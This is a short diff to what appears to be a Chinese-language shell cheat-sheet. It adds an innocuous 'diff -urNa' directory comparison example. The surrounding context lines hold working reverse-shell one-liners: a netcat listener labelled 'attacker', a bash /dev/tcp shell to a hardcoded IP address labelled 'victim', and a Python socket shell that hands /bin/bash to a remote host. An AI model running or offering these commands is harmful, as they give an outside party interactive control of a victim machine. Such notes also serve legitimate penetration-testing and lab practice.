@@ -140,4 +140,10 @@ nc -lnvvp 4444 # attacker
 bash -i >& /dev/tcp/60.205.223.161/4444 0>&1 # victim
 python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);" # victim
 ```
+
+对比两个文件不同
+```shell
+diff -urNa dir1 dir2
+```
+
 > 使用zsh运行bash命令可能会失败，可先切换到bash。mac下nc会报` missing port with option -l`错误，去掉参数p即可
